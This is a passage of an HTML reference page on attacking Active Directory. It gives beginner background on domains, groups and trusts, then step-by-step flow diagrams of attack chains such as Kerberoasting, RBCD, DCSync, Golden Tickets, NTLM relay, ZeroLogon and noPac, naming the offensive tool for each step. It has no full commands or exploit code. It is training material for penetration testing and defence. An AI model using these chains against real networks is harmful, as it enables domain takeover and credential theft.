  <rect x="985" y="325" width="170" height="50" rx="8" fill="#1a2332" stroke="#8b5cf6" stroke-width="1"/>
  <text x="1070" y="346" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Machine Account</text>
  <text x="1070" y="363" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">addcomputer.py &bull; MachineQuota</text>
  <rect x="985" y="390" width="170" height="50" rx="8" fill="#1a2332" stroke="#8b5cf6" stroke-width="1"/>
  <text x="1070" y="411" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">ADIDNS Time Bomb</text>
  <text x="1070" y="428" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Pre-register future hosts</text>
  <rect x="985" y="455" width="170" height="50" rx="8" fill="#1a2332" stroke="#8b5cf6" stroke-width="1"/>
  <text x="1070" y="476" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">GPO Backdoor</text>
  <text x="1070" y="493" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Sched task &bull; logon script</text>

  <!-- DOMAIN DOMINANCE column -->
  <rect x="1200" y="65" width="170" height="55" rx="8" fill="#1a2332" stroke="#ec4899" stroke-width="1.5"/>
  <text x="1285" y="86" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ec4899" font-weight="700">DCSync</text>
  <text x="1285" y="107" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">secretsdump &bull; Mimikatz</text>
  <rect x="1200" y="135" width="170" height="50" rx="8" fill="#1a2332" stroke="#ec4899" stroke-width="1.5"/>
  <text x="1285" y="156" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ec4899" font-weight="700">Golden Ticket</text>
  <text x="1285" y="173" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">krbtgt hash &rarr; forged TGT</text>
  <rect x="1200" y="200" width="170" height="50" rx="8" fill="#1a2332" stroke="#ec4899" stroke-width="1.5"/>
  <text x="1285" y="221" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ec4899" font-weight="700">Diamond Ticket</text>
  <text x="1285" y="238" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Modify legit TGT PAC</text>
  <rect x="1200" y="265" width="170" height="50" rx="8" fill="#1a2332" stroke="#ec4899" stroke-width="1.5"/>
  <text x="1285" y="286" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ec4899" font-weight="700">ExtraSID Attack</text>
  <text x="1285" y="303" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Golden + -519 Enterprise Admin</text>
  <rect x="1200" y="330" width="170" height="50" rx="8" fill="#1a2332" stroke="#ec4899" stroke-width="1.5"/>
  <text x="1285" y="351" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ec4899" font-weight="700">Trust Ticket</text>
  <text x="1285" y="368" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Trust key &rarr; inter-realm TGT</text>
  <rect x="1200" y="395" width="170" height="50" rx="8" fill="#1a2332" stroke="#ec4899" stroke-width="1.5"/>
  <text x="1285" y="416" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ec4899" font-weight="700">NTDS Dump</text>
  <text x="1285" y="433" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">All domain hashes</text>
  <rect x="1200" y="460" width="170" height="50" rx="8" fill="#1a2332" stroke="#ec4899" stroke-width="1.5"/>
  <text x="1285" y="481" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ec4899" font-weight="700">Forest Takeover</text>
  <text x="1285" y="498" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">SID history + trust key</text>

  <!-- Connection arrows between zones -->
  <line x1="205" y1="90" x2="250" y2="90" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowC)" opacity="0.5"/>
  <line x1="440" y1="90" x2="485" y2="90" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowR)" opacity="0.5"/>
  <line x1="695" y1="90" x2="740" y2="90" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowC)" opacity="0.5"/>
  <line x1="940" y1="90" x2="985" y2="90" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowP)" opacity="0.5"/>
  <line x1="1155" y1="90" x2="1200" y2="90" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowPk)" opacity="0.5"/>

  <!-- Cross-zone attack paths -->
  <line x1="440" y1="350" x2="485" y2="162" stroke="#f59e0b" stroke-width="1" marker-end="url(#arrowR)" opacity="0.3" stroke-dasharray="4,4"/>
  <line x1="440" y1="675" x2="485" y2="162" stroke="#f59e0b" stroke-width="1" marker-end="url(#arrowR)" opacity="0.3" stroke-dasharray="4,4"/>
  <line x1="695" y1="230" x2="1200" y2="90" stroke="#ef4444" stroke-width="1" marker-end="url(#arrowPk)" opacity="0.2" stroke-dasharray="6,4"/>
  <line x1="695" y1="580" x2="1200" y2="485" stroke="#ef4444" stroke-width="1" marker-end="url(#arrowPk)" opacity="0.2" stroke-dasharray="6,4"/>

  <!-- Legend -->
  <rect x="15" y="800" width="1370" height="90" rx="10" fill="#0c1424" stroke="#1e2d3d" stroke-width="1"/>
  <text x="700" y="825" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">ATTACK CHAIN LEGEND</text>
  <circle cx="40" cy="855" r="6" fill="#3b82f6"/><text x="55" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">Recon</text>
  <circle cx="130" cy="855" r="6" fill="#f59e0b"/><text x="145" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">Cred Access</text>
  <circle cx="250" cy="855" r="6" fill="#ef4444"/><text x="265" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">PrivEsc</text>
  <circle cx="345" cy="855" r="6" fill="#06b6d4"/><text x="360" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">Lateral</text>
  <circle cx="430" cy="855" r="6" fill="#8b5cf6"/><text x="445" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">Persistence</text>
  <circle cx="545" cy="855" r="6" fill="#ec4899"/><text x="560" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">Domain Dominance</text>
  <text x="760" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">&#x2500;&#x2500;  direct</text>
  <text x="880" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">- - -  chained</text>
  <text x="1000" y="859" font-family="JetBrains Mono" font-size="9" fill="#64748b">KEY: RBCD &rarr; S4U &rarr; TGS &rarr; impersonate &rarr; NT hash &rarr; DCSync &rarr; Golden &rarr; Forest</text>
</svg>
</div>

<div class="separator"></div>

<!-- ==================== AD BASICS ==================== -->
<div class="section-header"><h2><span>//</span> Active Directory <span class="blue">Basics</span> for Beginners</h2><p class="section-desc">Before attacking AD, understand what it is. These are the building blocks every technique relies on.</p></div>

<div class="data-flow-card"><h4>AD Structure Overview</h4><pre>
<span class="key">FOREST</span> (security boundary)
&#x2514;&#x2500;&#x2500; <span class="val">DOMAIN</span> (e.g., corp.local)                    <span class="comment">// NOT a security boundary</span>
    &#x251C;&#x2500;&#x2500; <span class="type">Domain Controller (DC)</span>               Hosts AD database (NTDS.dit), DNS, Kerberos KDC, LDAP
    &#x251C;&#x2500;&#x2500; <span class="type">Organizational Units (OUs)</span>           Containers for users, computers, groups &mdash; GPOs link to OUs
    &#x251C;&#x2500;&#x2500; <span class="type">Users</span>                                Each has: SID, NT hash, group memberships, attributes
    &#x251C;&#x2500;&#x2500; <span class="type">Computers</span>                            Machine accounts (COMPUTER$) &mdash; also have passwords/hashes
    &#x251C;&#x2500;&#x2500; <span class="type">Groups</span>                               Security groups control access; nesting creates complex paths
    &#x251C;&#x2500;&#x2500; <span class="type">Group Policy Objects (GPOs)</span>          Push config to all machines in linked OUs
    &#x251C;&#x2500;&#x2500; <span class="type">Service Accounts</span>                    Accounts running services &mdash; often over-privileged with SPNs
    &#x2514;&#x2500;&#x2500; <span class="val">CHILD DOMAIN</span> (e.g., eu.corp.local)   <span class="comment">// Parent-child trust is automatic &amp; transitive</span>
        &#x2514;&#x2500;&#x2500; <span class="danger">Child &rarr; Parent escalation is trivial (ExtraSID / raiseChild)</span>
</pre></div>

<div class="details-grid">
  <div class="detail-card border-blue"><span class="tag recon">BASICS</span><h3>Key AD Objects</h3><div class="card-sub">What you enumerate and attack</div><div class="card-body"><ul class="card-list"><li><strong>SID</strong> (Security Identifier): Unique ID for every object &mdash; e.g., S-1-5-21-...-500 (built-in admin). RID 512 = Domain Admins, 519 = Enterprise Admins</li><li><strong>SPN</strong> (Service Principal Name): Links a service to an account &mdash; SPNs on user accounts = Kerberoastable</li><li><strong>UPN</strong> (User Principal Name): user@domain.local format for authentication</li><li><strong>DN</strong> (Distinguished Name): Full LDAP path &mdash; CN=Admin,OU=Users,DC=corp,DC=local</li><li><strong>SAM Account Name</strong>: Legacy DOMAIN\username format</li><li><strong>DACL</strong>: Access Control List on every object &mdash; defines who can do what to it</li></ul></div></div>

  <div class="detail-card border-yellow"><span class="tag trust">BASICS</span><h3>Trust Types</h3><div class="card-sub">How domains and forests connect</div><div class="card-body"><ul class="card-list"><li><strong>Parent-Child</strong>: Automatic, bidirectional, transitive &mdash; child can escalate to parent via ExtraSID</li><li><strong>Tree-Root</strong>: Connects trees within a forest &mdash; transitive, bidirectional</li><li><strong>Forest (External)</strong>: Between forests &mdash; can be one-way or two-way. SID filtering applies</li><li><strong>Shortcut</strong>: Optimizes authentication between distant domains in same forest</li><li><strong>Realm</strong>: Trust with non-Windows Kerberos (e.g., Linux MIT Kerberos)</li><li><strong>Key concept</strong>: <span class="vuln">Domain &#x2260; security boundary</span>. Only the <strong>forest</strong> is a security boundary.</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag persist">BASICS</span><h3>Critical Groups</h3><div class="card-sub">Groups that grant privileged access</div><div class="card-body"><ul class="card-list"><li><strong>Domain Admins</strong> (RID 512): Full control of the domain &mdash; the primary target</li><li><strong>Enterprise Admins</strong> (RID 519): Full control of the entire forest (exists only in root domain)</li><li><strong>Schema Admins</strong> (RID 518): Can modify the AD schema (rare but devastating)</li><li><strong>Account Operators</strong>: Can create/modify most users and groups (often overlooked)</li><li><strong>Backup Operators</strong>: Can back up/restore any file including NTDS.dit &mdash; <span class="vuln">DCSync equivalent</span></li><li><strong>Server Operators</strong>: Logon to DCs, manage services &mdash; can escalate to DA</li><li><strong>DNSAdmins</strong>: Can load arbitrary DLL into DNS service on DC &mdash; <span class="vuln">code execution as SYSTEM</span></li><li><strong>Protected Users</strong>: Defensive group &mdash; disables NTLM, forces Kerberos AES, no delegation</li></ul></div></div>

  <div class="detail-card border-green"><span class="tag lateral">BASICS</span><h3>Authentication Protocols</h3><div class="card-sub">How users prove their identity</div><div class="card-body"><ul class="card-list"><li><strong>Kerberos</strong> (port 88): Default for domain auth &mdash; ticket-based, uses KDC on DC</li><li><strong>NTLM</strong> (embedded): Fallback when Kerberos fails &mdash; challenge-response, no mutual auth</li><li><strong>LDAP</strong> (389/636): Directory queries &mdash; authentication via simple bind or SASL</li><li><strong>SMB</strong> (445): File sharing &mdash; carries NTLM or Kerberos auth, signing is critical</li><li><strong>WinRM</strong> (5985/5986): Remote management &mdash; PowerShell remoting</li><li><strong>RDP</strong> (3389): Remote desktop &mdash; supports NLA (Network Level Authentication)</li><li><strong>When Kerberos fails</strong>: IP used instead of hostname, DC unreachable, cross-forest &rarr; falls back to NTLM</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== ATTACK FLOW CHAINS ==================== -->
<div class="section-header"><h2><span>//</span> Attack Flow Chains</h2><p class="section-desc">Step-by-step attack paths showing how techniques chain together — the connective tissue beginners miss.</p></div>

<div class="flow-block"><div class="flow-title red">RBCD &rarr; NT Hash (Resource-Based Constrained Delegation)</div><div class="flow-row">
  <div class="flow-node hl-orange">GenericWrite on target$</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">write RBCD</span></div>
  <div class="flow-node hl-red">msDS-AllowedToAct...</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">S4U2Self</span></div>
  <div class="flow-node hl-cyan">Forwardable TGS</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">S4U2Proxy</span></div>
  <div class="flow-node hl-purple">TGS as admin</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">impersonate</span></div>
  <div class="flow-node hl-pink">NT hash / shell</div>
</div></div>

<div class="flow-block"><div class="flow-title orange">Unconstrained Delegation &rarr; DCSync</div><div class="flow-row">
  <div class="flow-node hl-blue">Find unconstrained host</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">Coercer</span></div>
  <div class="flow-node hl-orange">Coerce DC &rarr; target</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">Rubeus dump</span></div>
  <div class="flow-node hl-cyan">Extract DC TGT</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">PTT</span></div>
  <div class="flow-node hl-pink">DCSync</div>
</div></div>

<div class="flow-block"><div class="flow-title rose">ACL Abuse Chain</div><div class="flow-row">
  <div class="flow-node hl-rose">ForceChangePwd</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f43f5e" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">&rarr;</span></div>
  <div class="flow-node hl-rose">GenericWrite</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f43f5e" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">&rarr;</span></div>
  <div class="flow-node hl-rose">WriteDACL</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f43f5e" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">&rarr;</span></div>
  <div class="flow-node hl-rose">AddMember</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f43f5e" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">&rarr;</span></div>
  <div class="flow-node hl-rose">WriteOwner</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f43f5e" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">&rarr;</span></div>
  <div class="flow-node hl-rose">GenericAll</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">&rarr;</span></div>
  <div class="flow-node hl-pink">DC GenericAll</div>
</div></div>

<div class="flow-block"><div class="flow-title cyan">ADCS ESC15 (EKUwu) &rarr; Domain Admin</div><div class="flow-row">
  <div class="flow-node hl-cyan">Find Schema v1 tmpl</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">certipy req</span></div>
  <div class="flow-node hl-cyan">Inject App Policy EKU</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">SAN admin</span></div>
  <div class="flow-node hl-cyan">Rogue cert issued</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">PKINIT</span></div>
  <div class="flow-node hl-pink">DA / NT hash</div>
</div></div>

<div class="flow-block"><div class="flow-title yellow">Child &rarr; Parent Domain (Trust Escalation)</div><div class="flow-row">
  <div class="flow-node hl-yellow">Own child domain</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#eab308" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">secretsdump</span></div>
  <div class="flow-node hl-yellow">Dump child krbtgt</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#eab308" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">get SIDs</span></div>
  <div class="flow-node hl-orange">Parent + Child SID</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">ticketer -519</span></div>
  <div class="flow-node hl-red">Golden + EA SID</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">DCSync parent</span></div>
  <div class="flow-node hl-pink">Forest owned</div>
</div></div>

<div class="flow-block"><div class="flow-title teal">SCCM &rarr; Domain Compromise</div><div class="flow-row">
  <div class="flow-node hl-teal">sccmhunter find</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#14b8a6" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">NAA creds</span></div>
  <div class="flow-node hl-orange">Harvest secrets</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#14b8a6" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">push coerce</span></div>
  <div class="flow-node hl-red">NTLM relay &rarr; LDAP</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">TAKEOVER</span></div>
  <div class="flow-node hl-pink">Site takeover</div>
</div></div>

<div class="flow-block"><div class="flow-title green">Kerberoasting &rarr; Domain Admin</div><div class="flow-row">
  <div class="flow-node hl-blue">Enumerate SPNs</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#10b981" stroke-width="1.5" marker-end="url(#arrowG)"/></svg><span class="arrow-label">GetUserSPNs</span></div>
  <div class="flow-node hl-orange">Request TGS (RC4)</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#10b981" stroke-width="1.5" marker-end="url(#arrowG)"/></svg><span class="arrow-label">hashcat 13100</span></div>
  <div class="flow-node hl-red">Crack offline</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">PtH / auth</span></div>
  <div class="flow-node hl-pink">Service acct access</div>
</div></div>

<div class="flow-block"><div class="flow-title purple">Shadow Credentials &rarr; NT Hash</div><div class="flow-row">
  <div class="flow-node hl-rose">GenericWrite on user</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">write key</span></div>
  <div class="flow-node hl-purple">msDS-KeyCredentialLink</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">certipy shadow</span></div>
  <div class="flow-node hl-cyan">Get certificate</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">PKINIT</span></div>
  <div class="flow-node hl-pink">NT hash / TGT</div>
</div></div>

<div class="flow-block"><div class="flow-title blue">PetitPotam &rarr; ESC8 &rarr; DCSync</div><div class="flow-row">
  <div class="flow-node hl-orange">Coerce DC (PetitPotam)</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">relay NTLM</span></div>
  <div class="flow-node hl-cyan">ntlmrelayx &rarr; ADCS HTTP</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">enroll as DC</span></div>
  <div class="flow-node hl-cyan">DC certificate</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">PKINIT</span></div>
  <div class="flow-node hl-red">DC TGT + NT hash</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">DCSync</span></div>
  <div class="flow-node hl-pink">All domain hashes</div>
</div></div>

<div class="flow-block"><div class="flow-title orange">LLMNR Poisoning &rarr; Relay &rarr; RBCD</div><div class="flow-row">
  <div class="flow-node hl-blue">Responder poisoning</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">capture auth</span></div>
  <div class="flow-node hl-orange">ntlmrelayx &rarr; LDAP</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">set RBCD</span></div>
  <div class="flow-node hl-red">RBCD on target</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">S4U chain</span></div>
  <div class="flow-node hl-purple">TGS as admin</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">secretsdump</span></div>
  <div class="flow-node hl-pink">NT hash / shell</div>
</div></div>

<div class="flow-block"><div class="flow-title pink">WriteDACL &rarr; DCSync &rarr; Golden Ticket</div><div class="flow-row">
  <div class="flow-node hl-rose">WriteDACL on domain</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">dacledit</span></div>
  <div class="flow-node hl-red">Grant DCSync rights</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">secretsdump</span></div>
  <div class="flow-node hl-pink">Dump krbtgt hash</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">ticketer</span></div>
  <div class="flow-node hl-pink">Golden Ticket</div>
</div></div>

<div class="flow-block"><div class="flow-title green">noPac &rarr; Domain Admin (CVE-2021-42278/42287)</div><div class="flow-row">
  <div class="flow-node hl-blue">Create machine acct</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#10b981" stroke-width="1.5" marker-end="url(#arrowG)"/></svg><span class="arrow-label">rename to DC</span></div>
  <div class="flow-node hl-orange">SAMAccountName = DC</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#10b981" stroke-width="1.5" marker-end="url(#arrowG)"/></svg><span class="arrow-label">request TGT</span></div>
  <div class="flow-node hl-red">TGT as DC name</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">rename back</span></div>
  <div class="flow-node hl-red">Request TGS &rarr; DC$</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">DCSync</span></div>
  <div class="flow-node hl-pink">Domain Admin</div>
</div></div>

<div class="flow-block"><div class="flow-title cyan">ZeroLogon &rarr; Instant DA (CVE-2020-1472)</div><div class="flow-row">
  <div class="flow-node hl-red">Netlogon zero challenge</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">~256 tries</span></div>
  <div class="flow-node hl-red">DC password &rarr; empty</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">auth as DC$</span></div>
  <div class="flow-node hl-pink">DCSync all hashes</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ec4899" stroke-width="1.5" marker-end="url(#arrowPk)"/></svg><span class="arrow-label">restore pwd</span></div>
  <div class="flow-node hl-pink">Domain owned</div>
</div></div>

<div class="flow-block"><div class="flow-title orange">gMSA Read &rarr; Lateral Movement</div><div class="flow-row">
  <div class="flow-node hl-blue">Find gMSA readers</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">gMSADumper</span></div>
  <div class="flow-node hl-orange">Read msDS-ManagedPwd</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arrowO)"/></svg><span class="arrow-label">extract hash</span></div>
  <div class="flow-node hl-cyan">gMSA NT hash</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">PtH / TGT</span></div>
  <div class="flow-node hl-pink">Service access / DA</div>
</div></div>

<div class="flow-block"><div class="flow-title purple">MSSQL Linked Servers &rarr; Code Execution</div><div class="flow-row">
  <div class="flow-node hl-blue">Find MSSQL (SPN enum)</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">mssqlclient</span></div>
  <div class="flow-node hl-orange">Enum linked servers</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#8b5cf6" stroke-width="1.5" marker-end="url(#arrowP)"/></svg><span class="arrow-label">EXEC AT</span></div>
  <div class="flow-node hl-red">Crawl link chain</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">xp_cmdshell</span></div>
  <div class="flow-node hl-pink">SYSTEM on SQL host</div>
</div></div>

<div class="flow-block"><div class="flow-title cyan">mitm6 (DHCPv6) &rarr; WPAD &rarr; Relay &rarr; DA</div><div class="flow-row">
  <div class="flow-node hl-cyan">mitm6 DHCPv6 poison</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">WPAD proxy</span></div>
  <div class="flow-node hl-orange">Victims auth via NTLM</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#06b6d4" stroke-width="1.5" marker-end="url(#arrowC)"/></svg><span class="arrow-label">ntlmrelayx</span></div>
  <div class="flow-node hl-red">Relay &rarr; LDAP(S)</div><div class="flow-arrow"><svg viewBox="0 0 36 20"><line x1="0" y1="10" x2="31" y2="10" stroke="#ef4444" stroke-width="1.5" marker-end="url(#arrowR)"/></svg><span class="arrow-label">delegate / add user</span></div>
  <div class="flow-node hl-pink">DA / RBCD / Shadow Creds</div>
</div></div>

